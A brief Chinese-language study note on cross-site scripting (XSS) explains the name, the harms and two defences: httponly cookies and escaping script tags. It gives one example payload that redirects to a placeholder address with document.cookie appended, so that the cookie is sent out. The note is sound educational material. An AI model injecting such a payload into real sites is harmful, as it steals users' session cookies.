# XSS

其实它原本的缩写应该是CSS但是因为有了CSS所以给它改名为XSS XSS全名是跨站脚本攻击 Cross-Site Scripting, XSS
将代码注入到用户浏览的网页上

简单的来说就是假设没有对用户发送的东西进行筛选，并且没有转义JS代码，就会出现例如 用户发送了一个`<script> location.href='xxx'+document.cookie</script>` 那么另一个用户在点击这个链接的时候就把自己的cookie发给了这个网址。

以下危害

- 窃取用户的 Cookie
- 伪造虚假的输入表单骗取个人信息
- 显示伪造的文章或者图片

## 如何防范?

- cookie 设置 httponly
- 过滤敏感字符 <script>, html 等 将这些字符进行转义
